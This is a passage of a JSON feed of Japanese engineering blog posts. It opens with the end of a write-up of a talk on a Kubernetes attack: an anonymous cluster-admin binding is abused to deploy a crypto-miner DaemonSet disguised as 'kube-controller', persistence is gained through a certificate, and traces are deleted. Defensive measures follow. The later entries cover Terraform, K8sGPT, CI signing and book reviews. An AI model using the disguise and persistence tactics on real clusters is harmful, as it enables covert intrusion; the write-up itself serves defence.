で、クラスタ内のすべてのリソースに対する権限を持っています。system:anonymous は匿名リクエストに対して割り当てられているユーザーです。Kubernetes クラスタに対して認証なしであらゆるリソース操作ができてしまいます。今回の攻撃シナリオは以下の通りです。Kubernetes API Server をスキャンし、設定ミスのあるクラスタを発見DaemonSet としてクリプトマイナー (XMRig) を設置cluster-admin の証明書を作成し、クラスタへの侵害を永続化証明書作成の痕跡を削除興味深い点として、クリプトマイナーを設置する際に ClusterRoleBinding と DaemonSet を作成しますが、リソース名を kube-controller とすることで正規のリソースを偽装しています。運用業務でクラスタ内のリソースを確認したとしても、クリプトマイナーの存在に気づかないかもしれません。リポジトリも kubernetesio/~ のように偽装しています。また今回はCSRを削除していますが、cluster-admin を持っていれば、クラスタ内で行われる検知の回避や防御の無効化も容易にできてしまいます。クラスタとは別のレイヤーで、監査ログの監視などを行う必要があるかもしれません。パブリッククラウドを利用する場合、クラスタ内のセキュリティ対策とクラウド上の監視サービスを併用するのが良さそうです。セッション後半では、取るべきセキュリティ対策について紹介しています。Kubernetes API Server へのアクセスのネットワーク制限--anonymous-auth=false による匿名リクエストを無効化アドミッションコントローラーによる cluster-admin のバインディング禁止検知策として、設定ミスの検知Kubernetes API への攻撃の検知マイニングの検知のそれぞれ3つの対策が挙げられています。設定ミスの対策では、system:anonymous や system:authenticated に付与された権限がないか確認するためのスクリプトが紹介されています。Kubernetes の監査ログを監視することも有効です。Google Cloud の Security Command Center (SCC) には脅威検知の機能がありますが、この機能を利用すれば GKE に対する設定ミスや攻撃を検知できます。(発表者は Google Cloud の方です)マイニングの検知について、IoC (Indicator of Compromise) を利用する方法がセッション内では紹介されています。既知のマルウェアコンテナや悪意のあるバイナリ、攻撃サーバのIPアドレス等と照合することで攻撃を検知します。SCC におけるマイニング検知のベストプラクティスも興味があれば読んでみてください。おわりにいかがだったでしょうか？Kubernetes への攻撃手法を知ることは、(それ自体面白いというのもありますが) リスクベースのセキュリティ対策を検討する上で非常に有用です。このセキュリティ対策はどのような攻撃リスクを軽減してくれるのかこの攻撃が行われた場合、どのセキュリティ対策によって防ぐことができるのかといった観点で考えてみることをお勧めします。Kubernetes クラスタを目指して、皆で取り組んでいきましょう。","link":"https://kyohmizu.hatenablog.com/entry/2023/12/31/040720","isoDate":"2023-12-30T19:07:20.000Z","dateMiliSeconds":1703963240000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Step Functionsを利用してNAT Gatewayを自動作成/削除する","contentSnippet":"概要本記事ではStep Functionsを利用して、Nat Gatewayを自動で作成/削除する方法について記載します。NAT Gatewayは作成しているだけでコストがかかるリソースであり、…","link":"https://qiita.com/ys1/items/abf8daab19f616b3d854","isoDate":"2023-12-29T15:25:41.000Z","dateMiliSeconds":1703863541000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"K8sGPT: Log Analyzer","contentSnippet":"Filter 一覧➜  k8sgpt filters listActive:> ReplicaSet> PersistentVolumeClaim> Service> StatefulSet> Node> Pod> Deployment> Ingress> CronJob> ValidatingWebhookConfiguration> MutatingWebhookConfigurationUnused:> HTTPRoute> HorizontalPodAutoScaler...","link":"https://zenn.dev/tozastation/articles/3e2b9e887639f4","isoDate":"2023-12-28T08:26:54.000Z","dateMiliSeconds":1703752014000,"authorName":"tozastation","authorId":"tozastation"},{"title":"K8sGPT: 概要","contentSnippet":"K8sGPT とはIt has SRE experience codified into its analyzers and helps to pull out the most relevant information to enrich it with AI.README.md, k8sgpt, https://github.com/k8sgpt-ai/k8sgptREADME.md の引用ですが、SRE Experience が Analyzerに体系化されており、最も関連性の高い情報を引き出してAIで補完するのに役立つと書かれています。 SRE Experien...","link":"https://zenn.dev/tozastation/articles/737871319fb33b","isoDate":"2023-12-28T07:16:37.000Z","dateMiliSeconds":1703747797000,"authorName":"tozastation","authorId":"tozastation"},{"title":"K8sGPT: Overview","contentSnippet":"What is K8sGPTIt has SRE experience codified into its analyzers and helps to pull out the most relevant information to enrich it with AI.README.md, k8sgpt, https://github.com/k8sgpt-ai/k8sgptSRE Experience & AnalyzersA class called Analyzer is defined for each resource in Kubernetes. Analyzer has Core (Pod, PVC, ReplicaSet, etc...) and Optional (HPA, PDB, NetworkPolicy, etc ...). You can choose your own or leave it to the default. See here for a complete list. Analyzer has validations defined for each resource. The content of this validation is connected to \'SRE experience\'. Verification content is manually defined.Example: SRE ExperienceDeployment AnalyzerRegarding Replicas, Desire and Actual do not match. (here impl.)PVC AnalyzerIf the PVC status is Pending and EventReason is Provisioning Failed.Node AnalyzerIf the node status corresponds to Node Not Ready or DiskPressure, MemoryPressure, PIDPressure, NetworkUnavailableWhere is GPT used?K8sGPT will send the following prompts along with the findings from the Analyzer. In the prompt below, you can see that we are asking GPT to provide a solution based on the error.Simplify the following Kubernetes error message delimited by triple dashes written in --- %s --- language; --- %s ---.Provide the most possible solution in a step by step style in no more than 280 characters.Write the output in the following format: Error: {Explain error here} Solution: {Step by step solution here}https://github.com/k8sgpt-ai/k8sgpt/blob/main/pkg/ai/prompts.goContributingIf you would like to implement this kind of functionality in Analyzer based on your knowledge of Kubernetes operations, please read this document! (here)","link":"https://tozastation.hashnode.dev/k8sgpt-overview","isoDate":"2023-12-28T05:55:08.000Z","dateMiliSeconds":1703742908000,"authorName":"tozastation","authorId":"tozastation"},{"title":"Googleが提供するBIツール「Looker」とは？","contentSnippet":"はじめに 2023年10月30日、Googleが提供するBIツール「Looker」が政府認定クラウドサービス(通称 ISMAP) に認定されました。「Looker」が“政府認定クラウドサービス”に　Google提供のBI […]The post Googleが提供するBIツール「Looker」とは？ first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/learn-about-looker/","isoDate":"2023-12-28T00:11:29.000Z","dateMiliSeconds":1703722289000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Google Cloud 検証環境を頑張りすぎず良い感じに整えた話","contentSnippet":"はじめに こんにちは！Sreake事業部 横尾（@866mfs）です。 3-shakeでは、社員なら誰でもGoogle Cloud の各種サービスを検証できる、検証環境アカウント（ここでは ”test.org” と表記） […]The post Google Cloud 検証環境を頑張りすぎず良い感じに整えた話 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/make-better-google-cloud-verification/","isoDate":"2023-12-25T23:43:35.000Z","dateMiliSeconds":1703547815000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Kubernetesのソースコードを読む Kubelet編","contentSnippet":"起動処理Kubeletの起動処理についてソースコードを追っていき、どんな処理をしているのかみていきたいと思います。読むソースコード: バージョン: v1.27.2https://github.…","link":"https://qiita.com/ys1/items/7a455c602424e591fe38","isoDate":"2023-12-25T15:06:41.000Z","dateMiliSeconds":1703516801000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"GitHub Actions で cosign を使って keyless 署名する","contentSnippet":"この記事は、3-shake Advent Calendar 2023 24日目のエントリ記事です。Container image が適切な方法で build されたものかどうかを確認するために署名…","link":"https://qiita.com/yteraoka/items/db13b1dd94fa9e115676","isoDate":"2023-12-24T14:16:16.000Z","dateMiliSeconds":1703427376000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Terraformのtfstateについて考える","contentSnippet":"この記事は3-shake Advent Calendar 2023の23日目の記事となります。3-shakeのカレンダー | Advent Calendar 2023 - QiitaこちらはSRE Tech Talk #6で話した内容に補足したものです。3-shake SRE Tech Talk #6 - connpass資料はこちらとなります。    tfstateとはtfstateの課題tfstateの管理場所をどうするか問題localS3/Google Cloud StorageGitLabTerraform Cloudtfstateを管理するリソースをどう管理する問題aws/gcloud コマンドterraform + local state 管理CloudFormation / Google Deployment Managertfstateをどう分割するか問題環境分離パターンディレクトリ分離パターンbackend-configパターンworkspace環境分離以外の分割をどうするか問題分割する観点プロバイダーで分割管理権限で分割変更頻度で分割依存の方向性で分割tfstate間のリソース参照まとめtfstateとはTerraformが管理しているリソースの状態を表すjson形式のファイルです。tfstateとterraformファイルと実際のリソースの状態を比較して、terraformコマンドが実行されます。一般的には直接変更せずterraform stateコマンドを通して変更を行い、一般ユーザがtfstateに触れることはないです。参考: Backend Configuration - Configuration Language | Terraform | HashiCorp Developertfstateの課題tfstateについて以下の課題があります。それぞれについて見ていきます。tfstateの管理場所tfstateを管理するリソースの管理tfstateの分割tfstateの管理場所をどうするか問題主な保存場所候補としては以下のものがあります。local(デフォルト)クラウドのオブジェクトストレージS3/Google Cloud StorageGitレポジトリ統合GitLabSaaS利用Terraform CloudlocalTerraformのデフォルト保存先です。Terraformを実行する同じディレクトリのterraform.tfstateに保存されます。1人もしくは変更頻度が著しく低い状況など特殊なとき使えるものとなります。git管理して複数人で使うこともできるが、コンフリクトが発生しうるので、チーム開発には向かないです。基本的には複数人でterraformを使用するときは非推奨です。参考: Backend Type: local | Terraform | HashiCorp DeveloperS3/Google Cloud Storage監理するクラウドのオブジェクトストレージに保存する方法です。これが標準的(当社比)なのかなと思っています。オブジェクトストレージなので、権限があればどこからでもアクセスすることができます。それゆえ、同時にTerraformが実行されるので排他ロックの処理が必要となります。S3バックエンドを使用した場合はDynamoDBを使用してstate lockを実現します。Google Cloud Storageは単体でstate lockをサポートしています。tfstateの参照権限をクラウドのIAMで制御する必要があります。参考: Backend Type: s3 | Terraform | HashiCorp Developer参考: Backend Type: gcs | Terraform | HashiCorp DeveloperGitLabGitLabでtfstateを監理することもできます。tfstateを管理するリソースを管理する必要がないことがメリットとなります。(後述します)開発にGitLabを使っている場合、親和性が高い方法となります。参考: GitLab-managed Terraform state | GitLabTerraform CloudGitLabと同様tfstateを管理するリソースを管理する必要がないというところにメリットがあります。月間500 Managed Rsourcesまで無料で使えます。参考: HashiCorp Terraform: Enterprise Pricing, Packages & Featuresweb上からリソース差分の確認できたり、applyが可能です。SaaSにクラウドのリソース情報を預けることに抵抗がない場合は選択肢としては有望です。なおTerraformのStateのドキュメントではこういう記述があり、Terraform Cloudを推奨しているようです。This state is stored by default in a local file named \\"terraform.tfstate\\", but we recommend storing it in Terraform Cloud to version, encrypt, and securely share it with your team.参考: State | Terraform | HashiCorp Developer昔はAWSと連携するためにIAM Userのアクセスキーを使わないといけなかったが、OIDC認証もできるようになったので、よりやりやすくなったかと思います。参考: Terraform Cloud Adds Dynamic Provider Credentials for Vault and Official Cloud Providers参考: Terraform Cloud | Terraform | HashiCorp Developertfstateを管理するリソースをどう管理する問題GitLabやTerraform Cloudを使う場合には起きない問題となります。S3のようなクラウドのオブジェクトストレージを使用する場合は、このS3バケットをどう作るかということが問題となります。コマンドで作る場合、コマンドの管理、terraformで作る場合はそのtfstateはどこに保存するか、そういったことに頭を悩ませます。そこについて考えていきます。以下の方法が考えられます。aws/gcloudコマンドterraform + local state管理CloudFormationaws/gcloud コマンドそもそも作成コマンドしか打たないのであれば、スクリプトをレポジトリに含めておけば良いという考え方はあります。基本的に一度作れば変えることはないので、これで十分という風に割り切ることはできます。ただし、tfstateのバケットだけでなく、CI/CD用のIAM RoleやOIDC認証リソースなども初期リソースとして含めて管理したいというユースケースだと、スクリプト管理では力不足になりうります。terraform + local state 管理オブジェクトストレージをterraformで作る方法です。ただし、tfstateに関してはlocalに保存し、これをgitも管理します。かたくなにterraformを使いたい人に向けな方法となります。デメリットとしては、tfstateもgit管理するのでコミット忘れがあります。また、頻度低いですがterraform自体はローカルで実行せざるを得ないので変更衝突が起きうることです。CloudFormation / Google Deployment Managerクラウドごとにコードを変えないといけない。IaCツールを2種類使うというそこはかとない気持ち悪さはあるというデメリットはありますが、gitでインフラ状態管理しなくてすむというメリットがあります。気持ち悪さだけを克服できるなら無難な選択肢だとは思います。tfstateをどう分割するか問題第一に考えるのが環境の分離。この分離の仕方だけ他とは系統が違うので独立して説明します。一部差分があるだけで、以下のような形でほぼ同じ構成の環境を作ることはよくあります。開発環境ステージング環境本番環境これらについてどう分割するのかを考えていきます。環境分離パターン大きく2つのパターンを利用することが多いです。それぞれ見ていきます。ディレクトリ分離パターンbackend-configパターンディレクトリ分離パターンこれは環境ごとにディレクトリを分割して、環境ディレクトリを実行単位とします。環境の切り替えはディレクトリ移動することで行います。環境ごとの差分が大きいときに使うことが多いです。デメリットとしては環境ごとにリソース定義をそれぞれ書くので記述量が多くなるというのがあります。そのため、可能な限りモジュール化して、なるべくパラメータだけの差分にするようにします。ディレクトリ構成例としては以下の通りです。.├── envs│   ├── dev│   │   ├── locals.tf│   │   ├── main.tf│   │   ├── outputs.tf│   │   └── variables.tf│   ├── prd│   │   ├── locals.tf│   │   ├── main.tf│   │   ├── outputs.tf│   │   └── variables.tf│   └── stg│       ├── locals.tf│       ├── main.tf│       ├── outputs.tf│       └── variables.tf└── modules    ├── vpc    │   ├── locals.tf    │   ├── main.tf    │   ├── outputs.tf    │   └── variables.tf    ├── application    │   ├── locals.tf    │   ├── main.tf    │   ├── outputs.tf    │   └── variables.tfbackend-configパターンbackend-configオプションとvars-fileオプションを組み合わせて、環境を切り替えるパターンです。${ENVDIR}/terraform.tfvars に環境ごとの差分パラメータを定義して、${ENVDIR}/backend.tfvars に環境ごとのtfstate保存先を定義します。terraform init で backend.tfvars を切り替えることで環境の切り替えを行います。環境ごとに差分が少ないときに向いています。差分は terraform.tfvars に記述されているパラメータだけなので、記述量が少なくて済みます。ただし差分が多くなるとcount, for_eachで分岐やループを作ることになり読みにくくなるというものがあります。ディレクトリ構成例としては以下のようになります。.├── envs│   ├── dev│   │   ├── backend.tfvars│   │   └── terraform.tfvars│   ├── prd│   │   ├── backend.tfvars│   │   └── terraform.tfvars│   └── stg│       ├── backend.tfvars│       └── terraform.tfvars├── locals.tf├── main.tf├── modules│   └── vpc│       ├── locals.tf│       ├── main.tf│       ├── outputs.tf│       └── variables.tf├── outputs.tf├── provider.tf└── variables.tf設定ではbackendをs3と指定しておき中身はオプションで指定するようにします。terraform {  backend \\"s3\\" {}}以下のようにterraform initするたびに適用する環境を切り替えることができる。terraform init --backend-config=${ENVDIR}/backend.tfvars --reconfigureterraform apply --var-file=${ENVDIR}/terraform.tfvarsworkspaceworkspaceは同じような環境を複製するときに使ういます。シングルテナント環境を量産する場合や開発環境を複数作る場合などに使います。環境を切り替える用途には作られてないとドキュメントまでは記載されています。参考: Managing Workspaces - Terraform CLI | Terraform | HashiCorp DeveloperIn particular, organizations commonly want to create a strong separation between multiple deployments of the same infrastructure serving different development stages or different internal teams. In this case, the backend for each deployment often has different credentials and access controls. CLI workspaces within a working directory use the same backend, so they are not a suitable isolation mechanism for this scenario.自分自身がworkspaceを実運用で使ったことがないので多くは語れないです。別でちゃんと使ってから書きたいと思います。参考: State: Workspaces | Terraform | HashiCorp Developer環境分離以外の分割をどうするか問題小さいサービスでは環境を分離するだけでだいたいは問題ないことがおおいですが、terraformを運用していると運用面、管理面でいろいろ課題が出てくると思います。管理するリソースが増えるとplan/applyの時間が増えたり、リソースの見通しが悪くなったりしてきます。特に実行時間が意外に馬鹿にできなかったりします。下手するとplanに数分かかるようになったりします。そのため、ある程度大きくなったらtrstateを分割して、リソースの管理範囲を分割する必要が出てきます。これをどうやって分割するかが自分の中で答えが出ていない出てないし、分脈によって解決策は異なるとは思います。ここで、解決策を考えるうえで、分割するための観点を見ていきましょう。分割する観点分割する観点は以下のようなものがあるかと思います。プロバイダー管理権限変更頻度プロバイダーで分割プロバイダー単位で分割するパターンです。例としてはAWSとDatadogのようにプロバイダーで分割します。プロバイダー間で依存がない場合は分けやすいかと思います。また、プロバイダー間で管理主体が違うことも多いので素直な分け方だとは思います。しかしながら、アプリケーションリソースとアプリケーションの監視を近いところにおいたほうが見通しがよいのではという観点もあるので運用体制にあわせて考えるとよいでしょう。管理権限で分割チームの権限で分割するパターンです。ただし、より堅くするなら、ディレクトリではなくレポジトリ自体も分割して、コードの参照権限も分割する方が望ましい場合もあります。例ネットワーク ⇒ インフラチームアプリケーション ⇒ 開発チーム変更頻度で分割変更をあまりしないリソースを変更が頻繁なリソースと一緒のplan/applyするのは無駄なので変更の頻度でtfstateを分割するパターンもあります。例変更が少ない ⇒ DB/ネットワーク変更が多い ⇒ EC2/ECS依存の方向性で分割少し観点を変えてみます。実際に分割をした場合に問題となるのはtfstate間のリソースの依存が課題になります。tfstate間で相互に依存するようなコードを書くとtarget指定してそれぞれのstateのリソースを作成しなくてはなりません。こうすると管理が煩雑となってしまうので、原則的に片方向だけの依存になるように分割するようにするのが望ましいです。tfstate間のリソース参照terraform_remote_state を使うことで、参照元のTerraformでoutputした内容を別のTerraformで利用することができます。# 参照元 networkアカウントoutput \\"vpc_id\\" {  value = aws_vpc.main.id}# 参照先 applicationアカウント# data.terraform_remote_state.network.vpc_id の形式でVPC IDを参照できるdata \\"terraform_remote_state\\" \\"network\\" {  backend = \\"s3\\"  config {    bucket = \\"terraform-tfstate-network-xxxxx\\"    key    = \\"tfstate\\"    region = \\"ap-northeast-1\\"  }}まとめ正直tfstateをどう扱うかに正解はないです。サービス規模や性質によって選択は変わります。本当に小さい規模であれば、tfstateを分割せず一つで十分でしょうし、チーム開発せず一人で扱うなら、通常であれば推奨されないtfstateのlocal git管理という手段がふさわしい場合もあります。また、組織やサービスの成長や時間経過によっても最適な選択は変わると思います。大事なのは選んだ技術要素に関しては選定理由を説明できるようにはしておくということです。選定理由及び不採用理由を明確にしておくことで、変更時に最適な選択の助けになるでしょう。","link":"https://blog.masasuzu.net/entry/2023/12/23/000000","isoDate":"2023-12-22T15:00:00.000Z","dateMiliSeconds":1703257200000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"testcontainers-scala で快適なインテグレーションテストを実現する","contentSnippet":"この記事は、3-shake Advent Calendar 2023 の 22 日目の記事です。 はじめに私の所属する株式会社スリーシェイクでは、Reckoner というデータパイプライン構築の SaaS を開発しています。https://reckoner.io/「SaaSをつなぐ。業務が変わる。ビジネスが進化する。」直感的なユーザーインターフェイスで、多種多様な SaaS のデータをつなぎ合わせることで、データ活用・データの民主化を実現します。 課題Reckoner では、データの取得・加工・保存部分を Scala で実装しており、データの連携先として、MySQL ...","link":"https://zenn.dev/nomadblacky/articles/173ea1f829eafa","isoDate":"2023-12-22T13:07:06.000Z","dateMiliSeconds":1703250426000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"AWS Network Firewall と NAT ゲートウェイの配置","contentSnippet":"はじめにAWS Network Firewall（以下 NWFW）の導入例を探してアーキテクチャ図を眺めていると，説明されている図によって NAT ゲートウェイ（以下 NATGW）との配置がまちまちであることに気づきます。つまり，プライベート・パブリックサブネットのシンプルな構成の場合，インターネット宛ての通信経路は大別するとプライベートサブネット→ NATGW→ NWFW →インターネットプライベートサブネット→ NWFW → NATGW →インターネットの2種類が存在します。それぞれのアーキテクチャの違いと，どちらを選定すべきかの指針についてまとめます。 1....","link":"https://zenn.dev/toshikish/articles/d7d15cd01a8584","isoDate":"2023-12-22T07:17:39.000Z","dateMiliSeconds":1703229459000,"authorName":"toshikish","authorId":"toshikish"},{"title":"社内チャットツールでGemini Proが使えるようになった話","contentSnippet":"1. はじめに はじめまして、Sreake事業部インターン生の井上です。私はSreake事業部にてSRE技術の調査と研究を行う目的で2023年3月6日から長期インターン生として参加しています。 本記事では、社内チャットツ […]The post 社内チャットツールでGemini Proが使えるようになった話 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/gemini-pro-introduction/","isoDate":"2023-12-21T08:49:07.000Z","dateMiliSeconds":1703148547000,"authorName":"Sreake","authorId":"Sreake"},{"title":"WIP: 2023年 俺が愛した本たち 非技術書編","contentSnippet":"この記事は、3-shake Advent Calendar 2023 21日目のエントリ記事です。はじめにプログラマー脳エンジニアのためのドキュメントライティング達人プログラマー 第2版スタッフエンジニアプロジェクト ヘイルメアリーサーキット・スイッチャー可燃物大規模言語モデルは新たな知性か？ブラジャーで天下をとった男さいごにはじめに2023年が終わろうとしています。年の瀬になると、いつも一年を振り返ることが私の習慣です。技術書に続いて、今年はさまざまな非技術書にも手を伸ばしました。小説や歴史、哲学、芸術の本など、多くのジャンルの本を読むことで、心が豊かになったと感じています。これらの本は、技術的なことだけではなく、人生について深く考えるきっかけをくれました。異なる文化や、普段とは違う視点の物語に触れることで、新しい考え方を学びました。これらの本が、私の考えを広げ、日々の生活に新しい刺激を与えてくれました。技術書と一緒に、これらの本も私のエンジニアとしての知識を形成する大切な部分になりました。2023年は、技術だけでなく、人生の学びにも終わりがないことを感じた一年でした。非技術書から得たことは、技術書から学んだことと相まって、私の理解を深めてくれました。読書を通じて得たこれらの経験は、来年もまた新しい発見への旅に私を連れて行ってくれるでしょう。そして、来年もまた、本とともに充実した一年になることを楽しみにしています。プログラマー脳『プログラマー脳 ～優れたプログラマーになるための認知科学に基づくアプローチ』は、プログラミングのスキル向上に認知科学の手法を応用した、画期的な書籍です。この本は、プログラマーがプログラムを読み書きする際に経験する認知的プロセスを深く掘り下げ、熟達したプログラマーと初心者の違いを明確に示しています。著者は、具体的なプログラミング技法や設計手法の直接的な説明を超え、認知のメカニズムを理解し活用することにより、プログラミングの学習と実践の改善を目指しています。プログラマー脳 プログラマーになるための認知科学に基づくアプローチノーブランド品Amazon本書の強みは、抽象的な概念を具体的な実例や演習を交えて解説することで、読者が新しいアイデアを自然に理解し、実践的な知識として身につけるのを助ける点にあります。また、プログラミングに関連する認知科学的な概念を、実際のプログラミングの状況にどのように適用するかについて、具体的かつ実用的なアドバイスを提供しています。こうしたアプローチは、読者がプログラミングに関する洞察を深め、より効率的かつ効果的に技術を習得する手助けをします。この本で特に興味深いのは、「意味波」という概念です。これは、新しい概念や技術を学ぶ過程で、抽象から具象、そして再び抽象へと進むプロセスを指します。このプロセスは、学習者が情報を受け取るだけでなく、それを自分の既存の知識や経験と結びつけ、より高い次元の理解へと昇華させるのに役立ちます。このアプローチは、新しい技術やアイデアを単に学ぶのではなく、それらを既存の知識構造に組み込んで深い理解を得ることに重点を置いています。他にも面白い概念や考え方が多いので、ぜひ読んでみてください。本書は、プログラミングにおける認知的側面を深く掘り下げることで、新しい学習法やスキル向上のアプローチを提供します。これにより、プログラミングのスキルを深め、熟達したプログラマーになるための貴重な知識と洞察を提供しています。『プログラマー脳』を読んで面白いと感じた方は、『言語の本質-ことばはどう生まれ、進化したか』も読んでみてください。『言語の本質-ことばはどう生まれ、進化したか』は、言語の起源と進化に焦点を当てた別の注目すべき書籍です。この本は、言語が人間にとってどのように重要なコミュニケーションツールとして発展してきたのかを探求しています。特に、オノマトペやアブダクション推論という人間特有の学びの力に焦点を置き、言語の進化と子どもの言語習得を通じて人間の根源に迫ります。著者は、言語の起源と進化に関する深い知見を提供し、言語が単なるコミュニケーションツール以上のものであること、すなわち、私たちの認知と感情、文化に深く根差した現象であることを明らかにします。言語の本質　ことばはどう生まれ、進化したか (中公新書)作者:今井むつみ,秋田喜美中央公論新社Amazon本書は、言語の抽象性や体系性、さらには言語がどのようにして複雑なシステムへと発展してきたのかを解明しています。これらのトピックを通じて、読者は言語の複雑な構造と機能、そして人間の認知プロセスとの関連を理解することができます。この本は、言語学、認知科学、心理学に興味を持つ読者にとって、知識の深化と洞察の拡大に貢献するでしょう。それぞれ異なる領域において人間の認知能力と学習の本質に深く切り込んでいる『プログラマー脳』と『言語の本質』に加えて、『進化心理学から考えるホモサピエンス 一万年変化しない価値観』も非常に興味深い本です。『プログラマー脳』では、プログラミングの習得と実践に認知科学を適用し、『言語の本質』は言語の起源と進化を探求することで人間の認知プロセスを解析しています。これらの本は、それぞれの分野において新たな洞察を提供し、読者の理解とスキルの向上に貢献します。進化心理学から考えるホモサピエンス　一万年変化しない価値観作者:アラン・S・ミラーパンローリング株式会社Amazon『進化心理学から考えるホモサピエンス 一万年変化しない価値観』は、進化心理学の観点から、人間の行動や価値観がどのように進化してきたかを探る一冊です。この本は、私たちの行動や意思決定に影響を与える進化的適応について深く掘り下げ、現代の社会や文化における人間の行動パターンを進化心理学的視点から分析します。この並びで本書を紹介するのは、伊藤計劃の『虐殺器官』が『言語学、進化心理学SFの傑作である』ためで、この本は人生を変えるぐらい面白い本だったからです。また、『ゆる言語学ラジオ』も聞いており、とても良かったのでおすすめです。www.youtube.comエンジニアのためのドキュメントライティングDocs for Developers: An Engineer’s Field Guide to Technical Writingの翻訳本です。書いた書評のブログ記事では、この本が良いドキュメントの特徴を架空の開発チームのストーリーを通して教えることで、読者にドキュメンタリアンとしての情熱を呼び起こすと評価されています。syu-m-5151.hatenablog.com原著は読んでないです。やっててよかったO\'Reillyサブスクは原著版のみあります。learning.oreilly.comまた、技術ドキュメントではないいですが『三行で撃つ 〈善く、生きる〉ための文章塾』もおすすめです。この本は読者に向けた独特なアプローチで、文章技術の向上を目指す実用書です。作家の近藤康太郎氏によるこの本は、ただのテクニック本にとどまらず、書くという行為を通じて自己の実存を考えさせられる思想書としての側面も持ち合わせています。文章テクニックだけでなく、企画の立て方、時間・自己管理術、インプットの方法、思考の深め方に至るまで幅広くカバーし、リリカルな思想とロジカルな技術を融合させています。また、他人の目で空を見ず、自分だけの言葉で書くことの重要性や、「説明しない技術」を身に付けることの必要性を強調し、読者が自然に感情を動かされる文章を書くための技術を教えてくれます。文章を通じて善く生きるための深い洞察を提供する、稀有な一冊です。技術ドキュメントとの差異が分かるので理科系の作文技術や数学文章作法などと一緒に読むと自分がその時に書くべき文章がわかってくる。www.youtube.com同著者の近藤康太郎の『百冊で耕す 〈自由に、なる〉ための読書術』は、読む行為を通じて自己を見つめ、新しい自己を発見するための思想書としても機能します。速読や遅読、批判的読書や没入的読書など、対立する読書法を探求し、それらを融合させることで多面的な読書体験を提案しています。近藤氏は、「本は百冊あればいい」と述べ、読者に自分にとってのカノン(聖典)100冊を選び、深く読み込むことで、知識を内面化し、己の一部にする方法を説いています。本書は、読書のご利益を探求し、勉強、孤独、愛、幸せ、生きることについての疑問を掘り下げ、読むことで自分が変わり、他者や世界を愛する新たな自分を発見する旅を提案しています。達人プログラマー 第2版『達人プログラマー ―熟達に向けたあなたの旅― 第2版』は、David ThomasとAndrew Huntによる名著で、ソフトウェア開発者がより効率的かつ生産的になるための実践的アプローチを提供する一冊です。本書は特に今年読んだわけではないものの、非常に多く引用して、活用している価値のある本としてあげておきます。プログラマーとしての技術面だけでなく、問題解決の姿勢やプロフェッショナリズムについても深く掘り下げています。例えば、「猫がソースコードを食べちゃった」というセクションでは、責任を持つ重要性を強調し、「石のスープとゆでガエル」では、プロジェクト進行の重要なポイントを示唆します。また、「伝達しよう！」のセクションでは、効果的なコミュニケーションの重要性を説いています。また、プロジェクトマネジメントやチームワーク、プロフェッショナルとしての姿勢に関する深い洞察を提供し、エンジニアとしてのキャリアを積む上での貴重な指針となります。本書はあまりに網羅的な内容のため、各セクションに関連する本での補完が必要だと思います。しかし、特に技術系のポエム記事に触れたことがある読者には、この一冊を深く読み込むことを強くお勧めします。『達人プログラマー』は、プログラマーだけでなく、あらゆるソフトウェア開発に関わる全ての人にとって、読む価値のある一冊です。『SOFT SKILLS ソフトウェア開発者の人生マニュアル 第 2 版』も同様にオススメですがこちらの方がバラエティに富んでいるのでちょっとエンジニアリング以外のコラムも読みたい方はこちらの方がオススメです。達人プログラマー ―熟達に向けたあなたの旅― 第2版作者:David Thomas,Andrew Huntオーム社Amazonスタッフエンジニア『スタッフエンジニア　マネジメントを超えるリーダーシップ』はWill Larsonによる本で、エンジニアリングキャリアのシニアレベル以上を目指す人にとって重要な指針を提供する一冊です。Will Larsonは、EM（エンジニアリングマネージャー）としてのチームのつくりかた、VPやDirectorとしての組織のつくりかたに関する洞察を提供する『An Elegant Puzzle』の著者でもあります。本書の洋書版を読む気力がなかった私にとって、翻訳本の出版はありがたいことでした。また、LarsonのHow to invest in technical infrastructureという記事も、共通基盤への投資方法について記述しており、非常に参考になるためオススメです。さて、本の内容に戻りますと、第1章ではスタッフエンジニアの役割とその意味を深く掘り下げ、技術力だけでなく組織内での影響力とリーダーシップの重要性を強調しています。これらの役割をどのように達成し、キャリアを前進させるかについて詳細に説明しており、特に印象的なのは、「スタッフエンジニアになれば自分の仕事を自分で管理でき、誰もがあなたに従い、あなたの望むことをするようになると考えたら大間違いだ」という言葉です。これはスタッフエンジニアの役割に関する一般的な誤解を解き明かしています。さらに、シニアエンジニアからスタッフプラスエンジニアへの進化を探る第3章、転職の決断を考慮する第4章、そして現役スタッフエンジニアのインタビューを通じて彼らの日常と役割の変化を深く掘り下げる第5章が続きます。全体を通して、この本は技術的なキャリアパスにおいてマネジメントの道を選ばないエンジニアにとって、必読の書です。各章は、スタッフエンジニアとしての役割を深く理解し、実現するための具体的な手法を提供しています。この本は、私のような経験豊富なエンジニアにとっても新たな学びとなり、これからのキャリアにおいて大いに参考になります。スタッフエンジニア　マネジメントを超えるリーダーシップ作者:Will Larson日経BPAmazonプロジェクト ヘイルメアリーTBDサーキット・スイッチャーTBD可燃物TBD大規模言語モデルは新たな知性か？TBDブラジャーで天下をとった男TBDさいごにこの年、多くの非技術書に没頭することで、私は内面的な成長と感情の豊かさを体験しました。各々の書籍が示した独特の感性や深い感動は、私の人間性を拡げ、心を満たしてくれました。皆さんからの心に残る作品の推薦も、来年の読書リストに追加し、楽しみにしています。読書はただの趣味にとどまらず、私たちの感情や人格を育て、深める重要な行為です。来年も、私と一緒に、心の成長と感動の旅に出ましょう。2024年も感動に満ちた読書の時を過ごし、新しい自分を見つけ、心の成長を遂げる一年となりますように。","link":"https://syu-m-5151.hatenablog.com/entry/2023/12/21/165021","isoDate":"2023-12-21T07:50:21.000Z","dateMiliSeconds":1703145021000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"テーブル構造変更に伴う認可・権限管理を設計実装してみて思ったこと","contentSnippet":"※この記事は3-shake Advent Calendar 2023の20日目の記事ですはじめまして、@bayobayo0324 